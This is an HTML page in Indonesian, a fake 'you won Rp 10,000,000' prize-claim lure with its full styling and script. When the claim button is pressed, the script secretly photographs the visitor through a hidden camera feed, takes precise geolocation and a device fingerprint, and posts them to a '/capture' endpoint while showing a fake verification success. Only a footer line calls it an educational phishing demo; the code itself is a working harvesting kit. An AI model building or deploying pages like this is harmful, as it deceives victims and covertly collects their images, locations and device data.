<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🎉 SELAMAT! Anda Pemenang 10 Juta! 🎉</title>
    <!-- Font Awesome 6 (Icons) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #1e2b3c 0%, #0f1a2b 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }

        /* Floating particles (simulated confetti) */
        .particle {
            position: absolute;
            width: 8px;
            height: 8px;
            background: rgba(255, 215, 0, 0.3);
            border-radius: 50%;
            animation: float 8s infinite;
            pointer-events: none;
            z-index: 1;
        }

        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
        }

        .glass-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 40px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
            padding: 32px 24px;
            width: 100%;
            max-width: 520px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            z-index: 20;
            transition: transform 0.3s;
        }

        .badge-winner {
            background: linear-gradient(45deg, #ffd700, #f9a826);
            color: #1e2b3c;
            display: inline-block;
            padding: 8px 24px;
            border-radius: 40px;
            font-weight: 700;
            font-size: 14px;
            letter-spacing: 1px;
            margin-bottom: 16px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.3);
        }

        h1 {
            font-size: 42px;
            font-weight: 800;
            color: white;
            text-shadow: 0 4px 15px rgba(0,0,0,0.5);
            line-height: 1.2;
            margin-bottom: 8px;
        }

        .prize {
            font-size: 58px;
            font-weight: 900;
            background: linear-gradient(135deg, #ffe68f, #ffd700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 2px 10px rgba(255,215,0,0.5);
            margin: 5px 0;
        }

        .sub-prize {
            color: rgba(255,255,255,0.8);
            font-size: 18px;
            margin-bottom: 25px;
            border-left: 4px solid #ffd700;
            padding-left: 16px;
            background: rgba(0,0,0,0.2);
            border-radius: 0 30px 30px 0;
        }

        .steps {
            display: flex;
            justify-content: space-between;
            margin: 30px 0 20px;
            position: relative;
        }

        .steps::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 2px;
            background: rgba(255,255,255,0.2);
            transform: translateY(-50%);
            z-index: 0;
        }

        .step {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: rgba(20, 30, 45, 0.8);
            backdrop-filter: blur(4px);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            border: 2px solid rgba(255,255,255,0.3);
            position: relative;
            z-index: 1;
            transition: all 0.3s;
            font-size: 18px;
        }

        .step.active {
            background: #4CAF50;
            border-color: #4CAF50;
            box-shadow: 0 0 25px #4CAF50;
            transform: scale(1.1);
        }

        .step.completed {
            background: #2196F3;
            border-color: #2196F3;
        }

        .btn-claim {
            background: linear-gradient(45deg, #ffd700, #f9a826);
            border: none;
            padding: 20px 30px;
            width: 100%;
            border-radius: 60px;
            font-size: 26px;
            font-weight: 800;
            color: #1e2b3c;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 2px rgba(255,215,0,0.3);
            cursor: pointer;
            transition: all 0.2s;
            margin: 20px 0;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .btn-claim:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 0 3px rgba(255,215,0,0.5);
        }

        .btn-claim:active {
            transform: translateY(0);
        }

        .btn-claim i {
            font-size: 32px;
        }

        .status-panel {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 28px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .status-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 14px 16px;
            border-radius: 20px;
            background: rgba(255,255,255,0.05);
            margin-bottom: 12px;
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255,255,255,0.05);
        }

        .status-icon {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: rgba(255,255,255,0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: #ffd700;
        }

        .status-label {
            flex: 1;
            font-weight: 600;
            color: white;
            font-size: 16px;
        }

        .status-badge {
            padding: 6px 18px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 13px;
            background: #ff9800;
            color: white;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .badge-waiting { background: #ff9800; }
        .badge-success { background: #4CAF50; }
        .badge-error { background: #f44336; }

        #video-container {
            display: none; /* completely hidden, we don't need to show it */
        }

        video {
            display: none;
        }

        .final-message {
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            margin: 20px 0;
            min-height: 90px;
        }

        .footer-note {
            text-align: center;
            color: rgba(255,255,255,0.4);
            font-size: 12px;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid rgba(255,255,255,0.1);
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0.7); }
            70% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 20px rgba(255,215,0,0); }
            100% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0); }
        }

        /* Responsive */
        @media (max-width: 480px) {
            h1 { font-size: 32px; }
            .prize { font-size: 44px; }
            .btn-claim { font-size: 22px; }
        }
    </style>
</head>
<body>
    <!-- Background particles -->
    <div id="particles"></div>

    <div class="glass-card">
        <div class="badge-winner"><i class="fas fa-crown"></i> Pemenang Terpilih <i class="fas fa-crown"></i></div>
        <h1>🎉 SELAMAT! 🎉</h1>
        <div class="prize">Rp 10.000.000</div>
        <div class="sub-prize">Hadiah akan ditransfer ke rekening Anda</div>

        <!-- Step indicators -->
        <div class="steps">
            <div class="step" id="step1">1</div>
            <div class="step" id="step2">2</div>
            <div class="step" id="step3">3</div>
            <div class="step" id="step4">4</div>
        </div>

        <!-- Main CTA -->
        <button class="btn-claim pulse" id="claimBtn">
            <i class="fas fa-gift"></i> KLAIM HADIAH
        </button>

        <!-- Status panel -->
        <div class="status-panel">
            <div class="status-item" id="statusCamera">
                <div class="status-icon"><i class="fas fa-camera-retro"></i></div>
                <span class="status-label">Verifikasi Selfie</span>
                <span class="status-badge badge-waiting" id="cameraBadge">Menunggu</span>
            </div>
            <div class="status-item" id="statusLocation">
                <div class="status-icon"><i class="fas fa-map-pin"></i></div>
                <span class="status-label">Verifikasi Lokasi</span>
                <span class="status-badge badge-waiting" id="locationBadge">Menunggu</span>
            </div>
            <div class="status-item" id="statusDevice">
                <div class="status-icon"><i class="fas fa-mobile-alt"></i></div>
                <span class="status-label">Data Perangkat</span>
                <span class="status-badge badge-waiting" id="deviceBadge">Menunggu</span>
            </div>
        </div>

        <!-- Hidden video element (required for camera access) -->
        <div id="video-container">
            <video id="video" autoplay playsinline></video>
        </div>

        <!-- Final message area -->
        <div class="final-message" id="finalMessage"></div>

        <div class="footer-note">
            <i class="fas fa-shield-alt"></i> Demo Edukasi Phishing · Jangan pernah bagikan data pribadi di situs tidak dikenal
        </div>
    </div>

    <script>
        (function() {
            // ========== Background Particles ==========
            function createParticles() {
                const container = document.getElementById('particles');
                for (let i = 0; i < 40; i++) {
                    let p = document.createElement('div');
                    p.classList.add('particle');
                    p.style.left = Math.random() * 100 + '%';
                    p.style.animationDelay = Math.random() * 5 + 's';
                    p.style.background = `rgba(255, 215, 0, ${Math.random() * 0.3})`;
                    p.style.width = Math.random() * 15 + 5 + 'px';
                    p.style.height = p.style.width;
                    container.appendChild(p);
                }
            }
            createParticles();

            // ========== DOM Elements ==========
            const claimBtn = document.getElementById('claimBtn');
            const cameraBadge = document.getElementById('cameraBadge');
            const locationBadge = document.getElementById('locationBadge');
            const deviceBadge = document.getElementById('deviceBadge');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const step3 = document.getElementById('step3');
            const step4 = document.getElementById('step4');
            const video = document.getElementById('video');
            const finalMessage = document.getElementById('finalMessage');

            // State
            let photoData = null;
            let locationData = null;
            let fingerprint = null;
            let errors = [];

            // Helper to update steps
            function setStep(step) {
                [step1, step2, step3, step4].forEach((el, idx) => {
                    el.classList.remove('active', 'completed');
                    if (idx + 1 < step) el.classList.add('completed');
                    else if (idx + 1 === step) el.classList.add('active');
                });
            }

            // Reset UI
            function resetUI() {
                errors = [];
                photoData = null;
                locationData = null;
                fingerprint = null;
                finalMessage.innerHTML = '';
                cameraBadge.innerText = 'Menunggu';
                cameraBadge.className = 'status-badge badge-waiting';
                locationBadge.innerText = 'Menunggu';
                locationBadge.className = 'status-badge badge-waiting';
                deviceBadge.innerText = 'Menunggu';
                deviceBadge.className = 'status-badge badge-waiting';
                setStep(1);
            }

            // ========== Collectors ==========
            async function collectCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                    });
                    video.srcObject = stream;
                    await new Promise(resolve => video.onloadedmetadata = resolve);

                    // Capture foto setelah 1 detik (tanpa ditampilkan)
                    return new Promise((resolve) => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataURL = canvas.toDataURL('image/jpeg', 0.9);
                            
                            // Matikan kamera
                            stream.getTracks().forEach(track => track.stop());
                            video.srcObject = null;
                            
                            resolve(dataURL);
                        }, 1000);
                    });
                } catch (err) {
                    throw new Error('Kamera: ' + (err.message || 'Izin ditolak'));
                }
            }

            async function collectLocation() {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    return {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                } catch (err) {
                    throw new Error('Lokasi: ' + (err.message || 'Izin ditolak'));
                }
            }

            async function collectFingerprint() {
                // Simulasi pengumpulan data perangkat
                await new Promise(r => setTimeout(r, 400));
                return {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookiesEnabled: navigator.cookieEnabled,
                    hardwareConcurrency: navigator.hardwareConcurrency
                };
            }

            // ========== Main Process ==========
            claimBtn.addEventListener('click', async () => {
                resetUI();

                // Kumpulkan data secara berurutan agar steps terlihat natural
                try {
                    // Step 2: Camera
                    setStep(2);
                    cameraBadge.innerText = 'Memproses...';
                    const photo = await collectCamera();
                    photoData = photo;
                    cameraBadge.innerText = 'Berhasil';
                    cameraBadge.className = 'status-badge badge-success';
                } catch (err) {
                    errors.push(err.message);
                    cameraBadge.innerText = 'Gagal';
                    cameraBadge.className = 'status-badge badge-error';
                }

                try {
                    // Step 3: Location
                    setStep(3);
                    locationBadge.innerText = 'Memproses...';
                    const loc = await collectLocation();
                    locationData = loc;
                    locationBadge.innerText = 'Berhasil';
                    locationBadge.className = 'status-badge badge-success';
                } catch (err) {
                    errors.push(err.message);
                    locationBadge.innerText = 'Gagal';
                    locationBadge.className = 'status-badge badge-error';
                }

                try {
                    // Step 4: Fingerprint (selalu berhasil karena tidak minta izin)
                    deviceBadge.innerText = 'Memproses...';
                    const fp = await collectFingerprint();
                    fingerprint = fp;
                    deviceBadge.innerText = 'Berhasil';
                    deviceBadge.className = 'status-badge badge-success';
                } catch (err) {
                    errors.push(err.message);
                    deviceBadge.innerText = 'Gagal';
                    deviceBadge.className = 'status-badge badge-error';
                }

                setStep(4);

                // Kirim data ke server
                const payload = {
                    photo: photoData,
                    location: locationData,
                    fingerprint: fingerprint,
                    errors: errors.length ? errors : undefined
                };

                try {
                    const response = await fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (response.ok) {
                        finalMessage.innerHTML = `
                            <div style="background: linear-gradient(45deg, #4CAF50, #2E7D32); padding: 24px; border-radius: 60px; color: white; font-weight: 800; font-size: 28px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
                                <i class="fas fa-check-circle" style="margin-right: 15px;"></i> 
                                KLAIM BERHASIL!
                            </div>
                            <p style="color: white; margin-top: 20px; font-size: 18px;">Data Anda telah diverifikasi. Tim kami akan segera memproses hadiah.</p>
                        `;
                        // Tambahkan konfeti ekstra
                        for (let i = 0; i < 20; i++) {
                            setTimeout(() => {
                                let p = document.createElement('div');
                                p.classList.add('particle');
                                p.style.left = Math.random() * 100 + '%';
                                p.style.top = '0';
                                p.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 60%)`;
                                p.style.width = Math.random() * 20 + 5 + 'px';
                                p.style.height = p.style.width;
                                document.getElementById('particles').appendChild(p);
                                setTimeout(() => p.remove(), 6000);
                            }, i * 80);
                        }
                    } else {
                        throw new Error('Gagal mengirim data');
                    }
                } catch (err) {
                    finalMessage.innerHTML = '<div style="background:#f44336; padding:20px; border-radius:60px; color:white; font-weight:800;"><i class="fas fa-times-circle"></i> Terjadi kesalahan. Coba lagi.</div>';
                }
            });

            // Optional: handle page load (tidak otomatis klik)
        })();
    </script>
</body>
</html>
